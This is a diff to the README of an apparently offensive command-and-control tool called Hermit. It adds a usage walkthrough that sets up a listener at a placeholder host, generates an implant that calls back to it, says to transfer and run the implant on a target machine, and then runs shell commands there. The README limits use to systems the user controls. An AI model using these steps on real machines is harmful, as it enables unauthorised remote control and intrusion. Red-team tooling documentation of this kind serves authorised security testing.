@@ -20,6 +20,8 @@ It's prohibited to use on systems not under your control.
 # For Linux agent
 rustup target add x86_64-unknown-linux-gnu
 rustup target add i686-unknown-linux-gnu
+# `libxcb` is used for screenshots in Linux target machine.
+sudo apt install libxcb-xfixes0-dev
 
 # For Windows agent
 rustup target add x86_64-pc-windows-gnu
@@ -47,10 +49,30 @@ hermit server
 ### C2 Client
 
 ```sh
-hermit client -H your-c2-server.com -P 80
+# Connect to C2 server
+hermit client -H my-c2-server.com -P 9999
 
 # Print the usage.
 Hermit $ help
+
+# Add a new listener and start it
+Hermit $ listener add -H my-c2-server.com -P 8000
+Hermit $ listener start 0
+
+# Generate a new implant
+Hermit $ implant gen -l http://my-c2-server.com:8000/
+
+# After genrating, transfer the implant to target machine and run it.
+# When the target connected to our listener, we can control this machine.
+
+# List agents
+Hermit $ agents
+
+# Switch to a specified agent mode
+Hermit $ agent use 0
+
+# e.g. Execute shell command for the target
+Hermit [agent: agent_0123456] $ shell whoami
 ```
 
 <br />
